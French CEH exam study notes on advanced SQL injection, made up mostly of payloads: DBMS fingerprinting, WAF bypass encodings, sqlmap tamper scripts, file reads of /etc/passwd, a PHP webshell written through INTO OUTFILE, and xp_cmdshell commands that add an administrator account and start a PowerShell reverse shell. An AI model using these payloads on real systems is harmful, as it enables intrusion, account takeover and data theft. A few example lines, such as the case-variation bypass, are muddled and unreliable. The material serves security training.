# 🔴 Module 15 — Techniques Avancées : SQL Injection

> **CEH v13 | EC-Council**  
> `#WAFBypass` `#Fingerprinting` `#RCE` `#FileReadWrite` `#Obfuscation`

---

## 📌 Table des matières

1. [Fingerprinting des SGBD](#1-fingerprinting-sgbd)
2. [Bypass de filtres et WAF](#2-bypass-waf)
3. [Lecture et écriture de fichiers](#3-lecture-et-écriture-de-fichiers)
4. [Exécution de commandes OS](#4-rce-via-sqli)
5. [Extraction des métadonnées](#5-extraction-métadonnées)

---

## 1. Fingerprinting des SGBD

Identifier le SGBD pour adapter les payloads.

```sql
-- Commentaires (différences entre SGBD) :
MySQL          : -- , #, /* */
MSSQL          : --
Oracle         : --
PostgreSQL     : --
SQLite         : --

-- Concaténation de chaînes :
MySQL          : CONCAT('a', 'b')  ou  'a' 'b'
MSSQL          : 'a' + 'b'
Oracle         : 'a' || 'b'
PostgreSQL     : 'a' || 'b'

-- Version :
MySQL          : SELECT @@version  ou  SELECT version()
MSSQL          : SELECT @@version
Oracle         : SELECT * FROM v$version WHERE ROWNUM=1
PostgreSQL     : SELECT version()
SQLite         : SELECT sqlite_version()

-- Test automatique :
'||'a'='a    → Oracle/PostgreSQL (concaténation = 'aa' = 'a' → faux)
'+'a'='a'    → MSSQL
' UNION SELECT 1,@@version --  → MySQL/MSSQL (@@version)
```

---

## 2. Bypass de Filtres et WAF

### Case Variation

```sql
-- Filtre : bloque "select" (case-sensitive)
sElEcT * fRoM users
SELECT * FROM users     → CONTOURNE si filtre case-sensitive
```

### Commentaires dans les mots-clés

```sql
-- Insérer des commentaires SQL dans les mots-clés :
SE/**/LECT * FR/**/OM users
SE/*!LECT*/ * FROM users    ← MySQL inline comments
```

### Encodage

```
URL encoding :
  %27 = ' (apostrophe)
  %20 = espace
  %53%45%4C%45%43%54 = SELECT

Double URL encoding :
  %2527 = %27 = '

HTML entities :
  &apos; = '
  &#39; = '

Hex encoding (MySQL) :
  0x61646d696e = 'admin'
  SELECT * FROM users WHERE name = 0x61646d696e
```

### Null Bytes

```sql
-- Null byte pour tromper certains filtres :
' %00 UNION SELECT ...--
```

### Whitespace Alternatives

```sql
-- Remplacer les espaces :
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users   (%09 = TAB)
SELECT%0aUSERNAME%0aFROM%0aUSERS  (%0a = newline)
```

### Tamper Scripts sqlmap

```bash
# sqlmap tamper scripts pour bypass WAF :
sqlmap --tamper=space2comment      # Espaces → /**/
sqlmap --tamper=randomcase         # Variation de casse aléatoire
sqlmap --tamper=charencode         # URL encode les caractères
sqlmap --tamper=between            # Remplace > par NOT BETWEEN
sqlmap --tamper=equaltolike        # Remplace = par LIKE

# Combinaison de tamper scripts :
sqlmap -u "URL" --tamper=space2comment,randomcase,charencode
```

---

## 3. Lecture et Écriture de Fichiers

### Lecture (MySQL avec FILE privilege)

```sql
-- Lire /etc/passwd :
UNION SELECT LOAD_FILE('/etc/passwd'), 2, 3 --

-- Lire un fichier de configuration web :
UNION SELECT LOAD_FILE('/var/www/html/config.php'), 2, 3 --

-- Conditions pour LOAD_FILE :
-- 1. Utilisateur DB doit avoir le privilège FILE
-- 2. Le fichier doit être lisible par le processus MySQL
-- 3. secure_file_priv doit permettre ce chemin
```

### Écriture (INTO OUTFILE/DUMPFILE)

```sql
-- Écrire un webshell PHP dans le webroot :
UNION SELECT '<?php system($_GET["cmd"]); ?>', 2, 3 
INTO OUTFILE '/var/www/html/shell.php' --

-- Accéder au webshell :
http://target.com/shell.php?cmd=whoami

-- Conditions :
-- 1. Utilisateur DB avec privilège FILE
-- 2. Serveur MySQL peut écrire dans le webroot
-- 3. secure_file_priv vide ou contenant le chemin
```

---

## 4. RCE via SQLi (MSSQL xp_cmdshell)

```sql
-- xp_cmdshell (MSSQL) - exécution de commandes OS :

-- Vérifier si xp_cmdshell est activé :
EXEC xp_cmdshell 'whoami'

-- Si désactivé, l'activer (nécessite admin) :
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Exemples de commandes :
EXEC xp_cmdshell 'whoami'                         → nt service\mssqlserver
EXEC xp_cmdshell 'net user hacker P@ss /add'      → Ajouter un utilisateur
EXEC xp_cmdshell 'net localgroup administrators hacker /add'
EXEC xp_cmdshell 'powershell -enc BASE64_PAYLOAD'  → PS reverse shell
```

---

## 5. Extraction des Métadonnées

```sql
-- ─── MySQL / MariaDB ─────────────────────────────────────────
-- Lister toutes les bases de données :
UNION SELECT schema_name, 2, 3 FROM information_schema.schemata --

-- Lister les tables d'une DB :
UNION SELECT table_name, 2, 3 FROM information_schema.tables 
WHERE table_schema='target_db' --

-- Lister les colonnes d'une table :
UNION SELECT column_name, 2, 3 FROM information_schema.columns 
WHERE table_name='users' --

-- Extraire les données :
UNION SELECT username, password, 3 FROM users --

-- ─── MSSQL ───────────────────────────────────────────────────
-- Lister les bases :
UNION SELECT name, 2, 3 FROM master..sysdatabases --

-- Lister les tables :
UNION SELECT name, 2, 3 FROM dbname..sysobjects WHERE xtype='U' --

-- ─── Oracle ──────────────────────────────────────────────────
-- Lister les tables :
UNION SELECT table_name, 2, 3 FROM all_tables --

-- Lister les colonnes :
UNION SELECT column_name, 2, 3 FROM all_tab_columns 
WHERE table_name='USERS' --
```

---

## 🧠 Points clés à retenir pour l'examen

- **Fingerprinting** : `@@version` (MySQL/MSSQL), `v$version` (Oracle)
- **Bypass WAF** : case variation, commentaires, encodage URL, tamper scripts sqlmap
- **LOAD_FILE** / **INTO OUTFILE** : MySQL, nécessite privilège FILE
- **xp_cmdshell** : MSSQL uniquement, exécution OS → RCE
- **information_schema** : base de métadonnées standard MySQL/PostgreSQL
- **sqlmap --tamper** : scripts de bypass de WAF/filtres

---

*⬅️ [Types de SQLi](./02_types_sqli.md) | ➡️ [Outils et Labs](./04_outils_et_labs.md)*
